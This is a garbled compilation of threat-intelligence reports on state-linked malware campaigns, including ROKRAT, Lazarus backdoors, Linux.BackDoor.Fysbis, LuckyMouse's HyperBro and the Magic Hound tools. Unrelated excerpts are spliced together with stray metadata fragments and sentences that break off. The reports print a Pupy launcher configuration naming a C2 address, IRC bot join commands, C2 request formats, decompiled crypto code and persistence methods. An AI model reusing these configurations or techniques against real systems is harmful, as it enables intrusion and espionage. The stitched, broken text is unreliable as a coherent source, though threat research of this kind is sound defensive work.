action is to check if the file \"wsatra.tmp\" exists in the temporary directory of the current user This sample can be executed with 3 different arguments:\"Help\": the value configured by PoohMilk The file is a fake image starting with \"PNGF\".November 2017: \"North Korean Human Rights\" CampaignIn November 2017, Talos observed the latest Group123 campaign of the year, which included a new version of ROKRAT being used in the latest wave of attacks Group 123 again used one of their main calling cards, the malicious HWP document This time, Group 123 used a document containing information in relation to a meeting held on 1st November in Seoul, South Korea This document was alleged to have been written by a legal representative claiming to be representing the \"Citizens' Alliance For North Korean Human Rights And Reunification Of Korean Peninsula\" Group 123 once again uses information related to the Korean unification and now are claiming to highlight concerns related to human rights issues Following on with the normal Group 123 activity the document was written in perfect Korean text and dialect again suggesting the origin of this group is from the Korean peninsula.Further analysis of the document text allowed us to understand the context The document mentions 'Community of North Korean human rights and unification' with the lawyer claiming to be part of the \"Citizen's Alliance for North Korean Human Rights and North-South unification\" The main purpose of this document was an attempt to arrange a meeting to discuss items related to \"North Korean Human Rights Act\" and \"Enactment of a Law\" which was passed in 2016 in South Korea We believe that the document was attempting to target stakeholders within the '\uc62c\uc778\ud1b5' community in an attempt to entice them to join the discussion in an attempt to work on additional ideas related to these activities The meeting was due to take place on November 1, 2017 and this document was trying to garner additional interest prior to the meeting.Once again Group 123 leveraged the use of OLE objects within the HWP document Using base64 encoding the decoded binary is stored as HncModuleUpdate.exe and is then executed This is the ROKRAT dropper Talos suspect the filename may have been selected to make it appear within running processes as a potential Hancom updater.The dropper is used to extract a new resource named SBS This specific resource contains malicious shellcode used by the malware One of Group 123 oddities in this campaign was to drop the following picture as a decoy image to the user This image shows various publicly available images which look to be related to the Korean 'Independence Movement' and appear to be related to the Korean war.We began performing further in-depth analysis on this new version of ROKRAT and this is where we started to notice some similarities with Group 123s \"Evil New Years\" campaign The similitudes are discussed later in this paper.This ROKRAT variant contained anti-sandbox techniques But this opcode is not correctly supported by some debugging tools, Immunity Debugger for example, will replace the assembly by \"???\" in red making it difficult to attempt to debug.This version of ROKRAT came with a Browser Stealer mechanism which was similar, with a few modifications, to that used in the FreeMilk campaign using Freenki malware in 2016.Group 123 continued their use of Cloud platforms with this campaign, this time leveraging pCloud, Dropbox, Box and Yandex.Finally here is the PDB of the sample used during this campaign: d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdbJanuary 2018: \"Evil New Year 2018\" CampaignAs we observed at the beginning of 2017, Group 123 started a campaign corresponding with the new year in 2018 This campaign started on the 2nd of January The infection vector was a malicious HWP document:This decoy document is an analysis of the 2018 New Year speech made by the leader of North Korea The approach is exactly the same as what was seen in 2017 using a new decoy document This image contains shellcode used to decode the embedded final payload: ROKRAT This ROKRAT variant is loaded from memory It's a fileless version of ROKRAT This behavior shows that Group 123 is constantly evolving to avoid detection As usual, the ROKRAT sample uses cloud providers to communicate with the operator, this time leveraging Yandex, pCloud, Dropbox and Box.Links Between CampaignsCode SharingTalos has identified that Group 123 shares code between different malware Several features are shared in the samples mentioned in this article; however we will cover only two in this article: the reconnaissance phase and the browsers stealer.Reconnaissance PhaseThe ROKRAT samples used during the two \"Evil New Year\" and the \"North Korean Human Rights\" campaigns contained a reconnaissance phase In the \"Evil New Year\" campaign the payload was split into two parts, the first part contained the reconnaissance code In the other campaign the reconnaissance phase was directly included in the main payload This code is the same The malware uses the following registry key to get the machine type: HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData The \"System manufacturer\" value is used to identify the type of machine The code appears to be based on a forum post (rohitab.com) describing the use of the Win32 APIs used The code used to perform this task in the same that found within in a Freenki sample deployed in 2016.The malware is able to extract the stored passwords from Internet Explorer, Chrome and Firefox For Chrome and Firefox, the malware queries the sqlite database containing the URL, username and password:Additionally, they support the Microsoft Vault mechanism Here is the initialization of the Vault APIs:On the left, we have the ROKRAT sample and on the right the FreeMilk sample In a specific campaign, this actor took time to compromise multiple legitimate Korean platforms including Yonsei and the KGLS in order to forge the spear phishing campaign or to host the command and control This approach is not common with less advanced actors and demonstrates a high level of maturity and knowledge of the Korean region.However Group 123's activities are not limited to South Korea For international targets, they are able to switch to a more standard attack vector such as using Microsoft Office documents as opposed to the specific HWP documents used when targeting victims located in Korea Group 123 does not hesitate to use public exploits and scripting languages to drop and execute malicious payloads We can notice that this group uses compromised legitimate websites (mainly Wordpress) and cloud platforms to communicate with the infected systems This approach makes it difficult to detect communications through analysis of these network flows In addition to the Remote Administration Tools, we identified a wiper We conclude that this group was involved in a campaign of intelligence gathering and finally attempted destruction.With our current knowledge of this actor, we predict that they will not disappear anytime soon and will continue to be active during the coming years Group 123 is constantly evolving as the new fileless capability that was added to ROKRAT demonstrates", "Kervin

resemblance to a previous 2017 Lazarus attack, analyzed by BAE Systems, against targets in Asia The use of FileTokenBroker.dll was a key part of the group\u2019s attack in 2017, and they seem to have used the same modularized backdoor in the recent incident as well However, they still have the same capabilities and are essentially the same file The connection is necessary for conducting activities; and based on the backdoor\u2019s functions, these actions could be quite damaging to targets This complex setup makes it harder to detect and remove all the backdoors, and is more effective at hiding any activities The complexity and the capabilities of these backdoors present a tough problem for the targeted organizations It is a sophisticated attack that needs equally sophisticated security solutions Trend Micro Solutions The Lazarus group is an experienced organization, methodically evolving their tools and experimenting with strategies to get past an organization\u2019s defenses These and other tools used by the Lazarus group can be mitigated by routinely scanning the network for any malicious activity to help prevent the malware from entering and spreading through an organization In addition, educating employees and other key people in an organization on social engineering techniques can allow them to identify what to look out for when it comes to malicious attacks Other mitigation strategies include a multilayered approach to securing the organization\u2019s perimeter, which includes hardening the endpoints and employing application control to help prevent malicious applications and processes from being executed Trend Micro endpoint solutions such as Trend Micro Smart Protection Suites and Worry-Free Business Security can protect users and businesses from these threats by detecting malicious files and spammed messages as well as blocking all related malicious URLs Trend Micro Deep Discovery has an email inspection layer that can protect enterprises by detecting malicious attachments and URLs that could lead to malicious downloads Trend Micro XGen security provides a cross-generational blend of threat defense techniques to

group It uses a module structure where every module is implemented as a separate class Modules can be of the following two types: plug-ins and controllers The researched sample contained two plug-ins: one designed to work with the file system and another one consisting of a remote control shell and a network controller (executes POST and GET requests in a specified format) During the installation, the Trojan attempts to gain root privileges If it succeeds, the malware is installed in the folder /bin/ with the name rsyncd and with the description \u201csynchronize and backup service\u201d If it does not succeed, Linux.BackDoor.Fysbis.1 is installed in ~/.config/dbus-notifier as an executable file with the name dbus-inotifier and with the description \u201csystem service d-bus notifier\u201d Once it is launched, the Trojan verifies that its copy is not running and that the malware itself is not launched using the command interpreter nash Verifies that the \u201cecho $0\u201d command\u2019s output is different from \u201cnash\u201d Next, the malware checks whether it is configured to start automatically at system startup If this process is found, the Trojan recursively traverses the \u201c/usr/lib/systemd/\u201d directory and checks every file for the \u201c/bin/rsyncd\u201d string Verifies that there is no \u201crsyncd\u201d file in the \u201c/bin/\u201d folder If the Trojan does not have root privileges, it checks the \u201c~/.config/autostart/\u201d directory for the \u201cdbus-inotifier\u201d file If Linux.BackDoor.Fysbis.1 is not installed, it registers itself in autorun using one of the following methods: Adds the \u201c/bin/rsyncd & exit 0\u201d string to the end of all \u201crc.local\u201d files found in the /etc/ folder For example, if this process is active, the first option will be used If it is not active, the second option is to be used During the next step, the malware copies itself to the \u201c/bin/rsyncd\u201d folder (or to the \u201c~/.config/dbus-notifier/dbus-inotifier\u201d folder if the Trojan does not have root privileges) and launches the copy from this folder The address of the command and control server is stored in the Trojan\u2019s body Depending on which task the string corresponds to, different keys are utilized Linux.BackDoor.Fysbis.1 creates the directory \u201c/usr/lib/cva-ssys\u201d to store its files in it (\u201c~/.local/cva-ssys\u201d\u2014if the Trojan does not have root privileges) When operating, the Trojan uses the SQLite3 database with the name My_BD The database contains the following two tables: Chnnl(id,binary) and prms(id,dword) The dwell time value with \u201cid == 0x310031\u201d for the standby mode is stored in the prms table The value stands for the interval, during which the Trojan does not receive a reply with the payload from the command and control server The value with \u201cid == 0x320032\u201d stands for the dwell time value for active mode The Chnnl table contains configuration data of the backdoor This data is encrypted with the RC4 algorithm Then the buffer with the encrypted package is modified as follows: Two DWORD values are added to the beginning of the buffer The first DWORD value is equal to zero The second DWORD value is a hashtag and is calculated using the following function (MakeHash): unsigned __int16 CCryptor::ComputeHash(_BYTE *rc4_key, _DWORD rnd, _BYTE *crypted_data,  _QWORD size) {   _QWORD i;   _WORD result;   _BYTE CryptedByte;   _BYTE j;   i = 0LL;   result = 0LL;   while ( i < size )   {     CryptedByte = crypted_data[i];     j = 0;     while ( 1 )     {       result = ((unsigned __int8)result ^ CryptedByte) & 1 ? (rnd ^ (result >> 1)) :  (result >> 1);       ++j;       if ( j == 8 )         break;       CryptedByte >>= 1;     }     ++i;   }   return result; }   unsigned __int32 CCryptor::MakeHash(struct st_cryptor *cryptor, _BYTE *crypted_data,  __int64 size) {   _DWORD rnd;   rnd = GetRand(0, -1);   return (unsigned __int16)(HIWORD(rnd) ^ rnd) ^ (CCryptor::ComputeHash (&cryptor->rc4_key->buffer, (HIWORD(v4) ^ v4), crypted_data, size) << 16); }  The process of the configuration data extraction proceeds opposite to the method described above When the configuration data is extracted form the database, the backdoor verifies that the hash\u2019s calculated value corresponds to the one saved in the database It also checks the accuracy of the 11-byte signature Then the Trojan activates streams for every plug-in that waits for the package containing a command It also activates one stream to monitor database status, and another one to exchange data with the command and control server Once the Trojan receives the payload, it changes the request period to the dwell time value for the active mode The Trojan sends the following GET request to the command and control server: azureon-****.com/watch/?from=W2KIa&oe=YDxQ&aq=KDRHmedegqk&btnG=G&utm=DQ&ai=Y9DmdXRnRMCsX9Mm2KPXQOTAC azureon-****.com/search/?oe=BiQCNKF&aq=wl&oe=Zcl0al2GeHD&from=rfkpqRi-&ags=KZde&text=x &ags=AS79lq&channel=YJa3f673&aq=GyZCExee0D&ai=CgX0bplH8YtBf2ZtNYNiCwngv The from, oe, aq, btnG, utm parameters stand for random strings encoded with the BASE64 algorithm The string length is from 1 to 14 characters From the list of available parameters, the Trojan randomly chooses the ones it will use (from 2 to 11 parameters) This value is generated using the following method: The Trojan takes a random DWORD value and 7 bytes of the UID value for GET/POST requests stored in the backdoor\u2019s body The UID value is followed by the DWORD value equal to -1 if the first DWORD value is zero Otherwise, the second DWORD value is taken as the first value In return, the server can send an encoded package or the \u201c400\u201d value The Trojan checks whether the server's reply is positive by searching for the \u201cOK\u201d substring in it Then the backdoor checks the reply\u2019s size To decode the package, the BASE64 alphabet is used The last two characters are replaced with \u201c-\u201d and \u201c_\u201d The first 4 bytes in the received package are ignored; the next 7 bytes are the key that will be used for the next POST requests The rest of the package is the payload The string with this code is generated in the infected computer\u2019s memory and is used without being saved into the file The module monitoring the database checks the connection to the command and control server every millisecond If the connection is established, checks the values in the prms table of the database If these values are other than zero, the module sends them to the command and control server using the POST request To send the POST request, the Trojan uses a random DWORD value and 7 bytes of the key from the encrypted package received in reply to the GET request 11 bytes that the Trojan receives in the reply are encrypted with the XOR algorithm (similar to the one used to decrypt the reply to the GET request) Then the data is added to the encrypted 11 bytes of the key The POST request\u2019s title is generated similarly to the GET request\u2019s title The payload is generated using the following method: Using zero correction, a random DWORD value is written Then 11 bytes of the key for POST requests are written The key is received as a reply to the GET request Next, other data is added A random string with the length of 5 characters is added to the beginning of the buffer After the Trojan has sent 4 POST requests via this stream, it pauses for 1 second and then sends another POST request to the command and control server This request contains the sqlite3 library\u2019s functions, whose addresses were successfully acquired (maximum 13).", "By Denis Legezo  on June 13, 2018", "10:00 am", "April 03, 2019", "LuckyMouse hits national data center to organize country-level waterholing campaign", "Retrieved May 07, 2019.\nBy Denis Legezo  on June 13, 2018", "10:00 am", "April 03, 2019", "LuckyMouse hits national data center to organize country-level waterholing campaign", "Retrieved May 07, 2019", "Article Content What happened? In March 2018 we detected an ongoing campaign targeting a national data center in the Central Asia that we believe has been active since autumn 2017 The choice of target made this campaign especially significant \u2013 it meant the attackers gained access to a wide range of government resources at one fell swoop The operators used the HyperBro Trojan as their last-stage in-memory remote administration tool (RAT) The timestamps for these modules are from December 2017 until January 2018 The anti-detection launcher and decompressor make extensive use of Metasploit\u2019s shikata_ga_nai encoder as well as LZNT1 compression Kaspersky Lab products detect the different artifacts used in this campaign with the following verdicts: Trojan.Win32.Generic, Trojan-Downloader.Win32.Upatre and Backdoor.Win32.HyperBro A full technical report, IoCs and YARA rules are available from our intelligence reporting service (contact us intelligence@kaspersky.com) Who\u2019s behind it? Due to tools and tactics in use we attribute the campaign to LuckyMouse Chinese-speaking actor (also known as EmissaryPanda and APT27) Also the C2 domain update.iaacstudio[.]com was previously used in their campaigns The tools found in this campaign, such as the HyperBro Trojan, are regularly used by a variety of Chinese-speaking actors Regarding Metasploit\u2019s shikata_ga_nai encoder \u2013 although it\u2019s available for everyone and couldn\u2019t be the basis for attribution, we know this encoder has been used by LuckyMouse previously Government entities, including the Central Asian ones also were a target for this actor before Due to LuckyMouse\u2019s ongoing waterholing of government websites and the corresponding dates, we suspect that one of the aims of this campaign is to access web pages via the data center and inject JavaScripts into them How did the malware spread? The initial infection vector used in the attack against the data center is unclear It\u2019s possible the actor used a waterhole to infect data center employees The main C2 used in this campaign is bbs.sonypsps[.]com, which resolved to IP-address, that belongs to the Ukrainian ISP network, held by a Mikrotik router using firmware version 6.34.4 (from March 2016) with SMBv1 on board We suspect this router was hacked as part of the campaign in order to process the malware\u2019s HTTP requests The Sonypsps[.]com domain was last updated using GoDaddy on 2017-05-05 until 2019-03-13 FMikrotik router with two-year-old firmware and SMBv1 on board used in this campaign In March 2017, Wikileaks published details about an exploit affecting Mikrotik called ChimayRed According to the documentation, however, it doesn\u2019t work for firmware versions higher than 6.30 This router uses version 6.34 There were traces of HyperBro in the infected data center from mid-November 2017 Shortly after that different users in the country started being redirected to the malicious domain update.iaacstudio[.]com as a result of the waterholing of government websites These events suggest that the data center infected with HyperBro and the waterholing campaign are connected What did the malware do in the data center? Anti-detection stages The resulting deobfuscated code performs typical side loading: it patches pcAnywhere\u2019s image in memory at its entry point The patched code jumps back to the decryptor\u2019s second shikata_ga_nai iteration, but this time as part of the whitelisted application This Metasploit\u2019s encoder obfuscates the last part of the launcher\u2019s code, which in turn resolves the necessary API and maps thumb.db into the same process\u2019s (pcAnywhere) memory The first instructions in the mapped thumb.db are for a new shikata_ga_nai iteration Conclusions LuckyMouse appears to have been very active recently The TTPs for this campaign are quite common for Chinese-speaking actors, where they typically provide new solid wrappers (launcher and decompressor protected with shikata_ga_nai in this case) around their RATs (HyperBro) The most unusual and interesting point here is the target A national data center is a valuable source of data that can also be abused to compromise official websites Another interesting point is the Mikrotik router, which we believe was hacked specifically for the campaign The reasons for this are not very clear: typically, Chinese-speaking actors don\u2019t bother disguising their campaigns Maybe these are the first steps in a new stealthier approach Some indicators of compromise Droppers

primarily in the Middle East dating back to at least mid-2016 which we have named Magic Hound This appears to be an attack campaign focused on espionage Based upon our visibility it has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia The adversaries appear to have evolved their tactics and techniques throughout the tracked time-period, iterating through a diverse toolset across different waves of attacks Artifacts of this campaign was also recently published by Secureworks CTU We were able to collect over fifty samples of the tools used by the Magic Hound campaign using the AutoFocus threat intelligence tool The earliest malware sample we were able to collect had a compile timestamp in May 2016 The samples themselves ranged from IRC bots, an open source Python remote access tool, malicious macros, and others It is believed the use of specific tools may have coincided with specific attack waves by this adversary, with the most recent attacks using weaponized Microsoft Office documents with malicious macros Due to the large amount of data collected, and limitations on attack telemetry, this blog will focus primarily on the most recent attacks occurring in the latter half of 2016 ATTACK DETAILS The samples initially collected and associated with Magic Hound were Microsoft Word and Excel documents containing embedded malicious macros We were able to expand our data set by pivoting on infrastructure and tool behavior, which uncovered additional types of tools in use by Magic Hound, such as regular portable executable (PE) payloads, PE files compiled in .NET Framework, various forms of IRC bots, and an open source file-less Python remote access tool called Pupy The two legitimate websites we were able to identify were owned by organizations in the government and energy sectors Based on the existence of these malicious files on the legitimate websites, it is highly probable that the websites had already been compromised in some fashion At the time of investigation, the files had already been removed from the websites The two other delivery sites were ntg-sa[.]com, which may be trying to spoof a Saudi based information and communication technology conglomerate and mol.com-ho[.]me, which may be trying to spoof the Ministry of Labor A third delivery site was identified at its.com-ho[.]me which may appear to be a benign domain Several of these documents were also found on a seemingly unrelated, but benign-looking domain, briefl[.]ink We were ultimately able to identify multiple organizations in the government, energy, and technology sectors targeted by Magic Hound The weaponized documents themselves all contained malicious macros which were designed to call Windows PowerShell to retrieve additional tools A handful of lures with different themes were used repeatedly with variations throughout the eighteen collected documents They ranged from documents masquerading as official Saudi government forms to a holiday greetings card The forms masquerading as official government documents specifically used imagery from the Ministry of Health and the Ministry of Commerce claiming to be mandatory forms that required macros to be enabled Examples of the documents can be seen below:     INFRASTRUCTURE Analysis of the weaponized documents revealed some peculiarities right away These C2 servers also appeared to lack any relationships to each other and were hosted on a variety of VPS providers Two of the Word documents using the \u201cgerry knight\u201d author name however were found to be communicating to C2 servers on two specific domains, www1.chrome-up[.]date and www3.chrome-up[.]date Using these domains as pivot points, we were able to expand our data set What initially appeared as a disparate and segregated attack campaign appeared very rapidly to be a persistent and prolonged attack campaign with very specific goals in mind In total, we were able to collect over fifty different samples via infrastructure reuse, behavioral matching, and the reuse of a specific file for maintaining persistence These tools included Microsoft Office documents, portable executables (PE), .NET Framework PE files, Meterpreter, IRC bots, an open sourced Meterpreter module called Magic Unicorn, and an open sourced Python RAT called Pupy Interestingly as we continued to expand and pivot in our data set, one of the C2 IPs used by an IRC bot payload from Magic Hound was found to be the same IP used to deliver a different IRC bot called MPK Figure 3 Rocket Kitten and Magic Hound infrastructure overlap The MPK bot is not publicly available and had previously been attributed to an adversary group called \u201cRocket Kitten\u201d which has often been thought to be a state sponsored adversary operating in the Middle East region Although the likelihood of two different adversaries focused on espionage operating in the same geographical region using one specific IP and not being related somehow is fairly slim, due to limited telemetry, we lack additional corroborating evidence of a conclusive relationship During our analysis, we were able to determine the ultimate payload for several of these attacks One payload was a Python based open source remote administration tool (RAT) called Pupy A second payload was an IRC bot we have named MagicHound.Leash We have also seen this group use the Magic Unicorn module to generate a PowerShell script to deliver a shellcode-based payload We have categorized the custom tools in use by the Magic Hound campaign into five categories, with corresponding names in Table 1 Additional details for these tools may be found in the appendix TYPE NAME   Dropper MagicHound.DropIt   Executable Loader MagicHound.Fetch   Document Loader MagicHound.Rollover   Downloader MagicHound.Retriever   IRC Bot MagicHound.Leash    Table 1\u00a0 Types of MagicHound tools and their Corresponding Names MAGICHOUND.ROLLOVER The Magic Hound campaign used Word and Excel documents containing malicious macros as a delivery method, specifically attempting to load either the Pupy RAT or meterpreter which we have called MagicHound.Rollover We discovered two different techniques used in the PowerShell scripts, the first being a straightforward execute command of a string retrieved from the remote server The second technique appeared to be from a tool called Magic Unicorn, an open source module for meterpreter MAGICHOUND.FETCH In addition to loading payloads using macros within delivery documents, we observed the Magic Hound campaign using executables to load secondary payloads from a remote server Both a custom developed loader, which we have named MagicHound.Fetch, as well as the default loader that comes with Pupy were found to be in use The Fetch loader allowed us to use attributes within the loader to uncover more tools used by this group, which included a backdoor and an IRC bot Fetch first attempts to create persistent access to the targeted host then retrieve a secondary payload from a remote server To set up persistence, the loader writes a file to \u201cc:\\temp\\rr.exe\u201d and executes it with specific command line arguments to create auto run registry keys All Fetch samples drop the same exact executable to set up persistence However, they all used the same key \u201cagkrhfpdbvhdhrkj\u201d We found the PowerShell command used by Fetch within the source code of Magic Unicorn, which was also used in the Magic Hound delivery documents However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based payload which is likely to be meterpreter We have seen the Magic Hound campaign use both the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems Also, the configurations show the use of the \u201cobfs3\u201d (The Threebfuscator) transport, which is an obfuscation method to hide the true TCP-based communications protocol The \u201cobfs3\u201d is used in the Tor project and the specifics of this transport can be found at the Tor Project MAGICHOUND.DROPIT The Magic Hound campaign was also discovered using a custom dropper tool, which we have named MagicHound.DropIt The DropIt Trojan we analyzed is an executable that builds another executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order In all of the DropIt samples we collected, the dropper then saves the executable to the user\u2019s %TEMP% folder and executes the file We have also seen Magic Hound using DropIt as a binder, specifically dropping a legitimate decoy executable along with the malicious executable onto the target host The legitimate decoy executable and the malicious executable are then both executed, but with the malicious file running in the background and the decoy presented to the user These types of tactics are generally used for evasion and to not trigger and suspicion from the victim In one example, the decoy executable was a legitimate Flash installer, therefore from the victim\u2019s perspective, they would experience the expected behavior of a Flash installer MAGICHOUND.RETRIEVER We observed a DropIt sample installing another Trojan we call MagicHound.Retriever At a high level, Retriever is a .NET downloader that retrieves secondary payloads using an embedded URL in its configuration as the C2 Figure 4 Retriever HTTP request sent to its C2 server MAGICHOUND.LEASH The Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash We discovered this connection when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2 communications Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server All of its available commands (see Appendix), except for the VER command seen in Figure 5, must be issued by individuals in the IRC channel with nicknames that start with \u201cAS_\u201d or \u201cAF_\u201d Figure 5 Lecash bot responding to VER command There are a great deal of similarities between the IRC bot originally discussed in iSight\u2019s NEWSCASTER whitepaper and LEASH iSight\u2019s whitepaper provided details on an IRC bot, which some refer to as Parastoo based on the password used to join the IRC channel, as seen in the following network traffic generated when attempting to connect to the C2:    Parastoo Trojan MagicHound.Leash   USER AS_ # # :des NICK t__982 JOIN :#tistani Parastoo USER AS_a # # :des NICK Conroy JOIN :#kalk    \u00a0 Performing a binary diff revealed a 67% similarity between the Leash and Parastoo samples In addition to sharing significant portions of code, both of the IRC bots require an IRC user\u2019s nickname to start with either \u201cAF_\u201d or \u201cAS_\u201d to run commands on the system Also, the two bots have similar responses to \u201cVER\u201d commands seen in Figure 6 below, which differ slightly from the responses seen generated by Leash Figure 6 Parastoo Trojan responding to commands in similar manner to Leash MPKBot We also found a second IRC bot called MPK using the same IP for its C2 server that a Leash sample was hosted on This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communications protocol, as detailed in a \u00a0whitepaper by CheckPoint regarding a threat group called Rocket Kitten We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and the one referenced in the white paper have considerable similarities from a behavior standpoint as well as direct code overlap CONCLUSION The Magic Hound attack campaign is an active and persistent espionage motivated adversary operating in the Middle East region Organizations in the government, energy, and technology sectors have been targeted by this adversary, specifically organizations based in or doing business in Saudi Arabia None of the tools we uncovered were found to be exploit-driven, and relied exclusively on social engineering tactics to compromise targets While we did discover a potential relationship with the Rocket Kitten adversary group, we cannot confirm the extent of that relationship at this time, although we will continue to monitor the activities of Magic Hound We call this tool MagicHound.Rollover When the macro executes, it unhides a table that contains the contents of a legitimate document in an attempt to make the user less suspicious of the malicious activities occurring in the background The first technique is rather straightforward, using PowerShell\u2019s \u201ciex\u201d function to execute a string obtained from a remote server The Unicorn source code contains a comment for this specific PowerShell command, which is described as a \u201cone line shellcode injection with native x86 shellcode\u201d The shellcode begins with a stub that is responsible for decrypting additional shellcode To decrypt the additional shellcode, the stub code will start with an initial key, such as 0x6CAF9362 and XOR the first DWORD of the additional shellcode It will then add the resulting DWORD to the key that the stub code will use to decrypt the second DWORD and so on Two Rollover delivery documents (SHA256: 6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b and SHA256:

respond to this HTTP GET request with a large amount of data that includes a PowerShell script that also contains a DLL payload that is embedded as a series of base64 encoded chunks, that is then

PowerShell script loads the DLL payload directly into memory without saving it to the disk The Pupy payload was generated using the following configuration, which shows the C2 IP/port and the use of the \u201cobfs3\u201d transport:LAUNCHER_ARGS=['--host', '139.59.46[.]154:3543', '-t', 'obfs3']It appears the adversary used a majority of the following Pupy module to create the PowerShell commands used in the delivery documents: https://github.com/n1nj4sec/Pupy/blob/master/Pupy/Pupylib/payloads/ps1_oneliner.py MAGICHOUND.FETCH The custom loader Trojan used by this group, which we call MagicHound.Fetch is responsible for setting up persistent access to the system and to reach out to a remote server to download and execute a secondary payload It then writes a file named \u201crr.exe\u201d (SHA256: f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and executes it with specific command line arguments We found the command above within the source code of Magic Unicorn, which was also used in the Magic Hound delivery documents However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based payload PUPY LOADER Pupy comes with default loaders that run the RAT on a variety of different platforms, specifically Windows, OSX, Linux and\u00a0 We have seen the Magic Hound actors using both the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems We believe the Magic Hound campaign uses the DropIt Trojan to run legitimate applications that fit their social engineering, which in the example above included coercing the victim into updating their Flash Player At a high level, Retriever is a .NET downloader that downloads secondary payloads from servers associated with Magic Hound While the Trojan itself does not resemble the other Magic Hound tools, it does create a folder named \u201cc:\\temp\u201d that the Magic Hound loader creates to store its persistence executable, as previously discussed The folder name is quite generic and by itself is not a great correlation point, however, this coupled with the shared infrastructure makes a higher fidelity connection between the two A password variable is available but unused in this sample Instead, we will refer to the specific SOAP action (see \u201cSOAPAction\u201d field in previous example, specifically \u201cSetLog2\u201d) that the Trojan requests from the C2 server and the response from the C2 server After sending the C2 the system information, the malware then issues a second request for \u201cGetHasAnything\u201d, which will communicate with the C2 server and ask the server if it has a secondary binary for the Trojan to install If the C2 server provides any response to the \u201cGetHasAnything\u201d request, it then calls the \u201cGetIdAbOne\u201d SOAP method to obtain what we believe is a unique identifier for the system that the Trojan will use for further interaction with the C2 After receiving this variable, the Trojan calls the \u201cGetNameAbById\u201d to obtain a base64 string that will be the filename written in a newly created \u201cc:\\temp\u201d (decoded from \u201cYzpcdGVtcFw=\u201d) folder The Trojan will then call \u201cGetAbById\u201d, \u00a0which the C2 will provide a base64 string for the contents for the file to write to c:\\temp With the file written to the system, the Trojan calls the \u201cGetishideAbById\u201d SOAP action to determine whether or not the C2 server wishes to execute the newly dropped file in a hidden window Unfortunately, we were unable to obtain a secondary payload from an active C2 server MAGICHOUND.LEASH The Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash This tool was discovered when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2 communications The bot chooses a random name from 977 hardcoded possibilities, connects to an adversary owned IRC server and joins a channel using the following IRC commands: USER AS_a # # :des NICK Conroy JOIN :#kalk Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server The message sent to the C2 will be \u201cdir is maked.\u201d if successful or \u201cdir is not maked\u201d if unsuccessful MKDIR Same as MD subcommand RD Removes a specified directory The message sent to the C2 will be \u201cdir is removed.\u201d if successful or \u201cdir is not removed.\u201d if unsuccessful COPY Not supported MOVE Not supported REN Renames a specified file The message sent to the C2 will be \u201cfile is renamed.\u201d if successful or \u201cfile is not renamed.\u201d if unsuccessful EXE  Calls GetModuleFileNameA function to obtain the path to the currently running executable and sends it to the C2 server This suggests that the adversary\u2019s IRC nickname would need to have these prefixes to control the systems infected with this Trojan The adversary could have used this name requirement as an added measure to make sure other individuals did not join the IRC server and begin interacting with compromised systems MPKBot We also found a second IRC bot called MPK (SHA256: d08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19) using an IP that a Retriever sample was hosted on as a C2 server instead This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communications protocol, as discussed in the whitepaper by CheckPoint discussing a threat group called Rocket Kitten We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and the one discussed in the above white paper have considerable similarities from a behavior standpoint and both Trojan have direct code sharing between them From a behaviorial standpoint, both the IRC and custom protocol version of MPK save \u201ctmp.vbs\u201d and \u201ctmp1.vbs\u201d to the %TEMP% folder (both differed slightly but used the same variable names within the script) in order to copy the Trojan to its final location and to execute it The IRC variant creates a mutex named \u201cmpk1\u201d and attempts to connect to an IRC server at 45.58.37[.]142:6667 The MPK bot generates a random lowercase name and uses it to log into the IRC server Figure 7 shows the initial private messages sent from the MPK bot to the \u201cmpk\u201d account on the C2 server Figure 7 Initial private messages sent from MPK to the IRC C2 server The commands available within the MPK IRC bot are called via a jump table, rather than a switch statement used in the custom protocol variant of MPK !DeleteFile Deletes a specified file   !NickChange Changes the nickname that the Trojan uses to log into the C2 IRC server Writes it to \u201cnick435.tmp\u201d for subsequent logins !ProcessKill Terminates a process based on PID   !RenameFileFolder Renames a file or folder and returns a list of the containing folder to the C2 server !GetFileOfServer Writes a file from the C2 server to a specified file   !ExecuteCommand Uses the command prompt sub-process to execute commands and returns their results to the C2 ", "mcafee", "April 03, 2019", "McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid

Content This post was written with contributions from Jessica Saavedra-Morales, Thomas Roccia, and Asheer Malhotra.\u00a0 McAfee Advanced Threat Research analysts have discovered a new operation targeting humanitarian aid organizations and using North Korean political topics as bait to lure victims into opening malicious Microsoft Word documents Our analysts have named this Operation Honeybee, based on the names of the malicious documents used in the attacks Advanced Threat Research analysts have also discovered malicious documents authored by the same actor that indicate a tactical shift These documents do not contain the typical lures by this actor, instead using Word compatibility messages to entice victims into opening them The Advanced Threat Research team also observed a heavy concentration of the implant in Vietnam from January 15\u201317 Background  On January 15, Advanced Threat Research discovered an operation using a new variant of the SYSCON backdoor The Korean-language Word document manual.doc appeared in Vietnam on January 17, with the original author name of Honeybee Document properties This malicious document contains a Visual Basic macro that dropped and executed an upgraded version of the implant known as SYSCON, which appeared in 2017 in malicious Word documents as part of several campaigns using North Korea\u2013related topics The malicious Visual Basic script uses a unique key (custom alphabet) to encode data We have seen this in previous operations using SYSCON This key was also used in the Honeybee campaign and appears to have been used since August 2017 Examples of decoy documents Several additional documents surfaced between January 17 and February 3 All contain 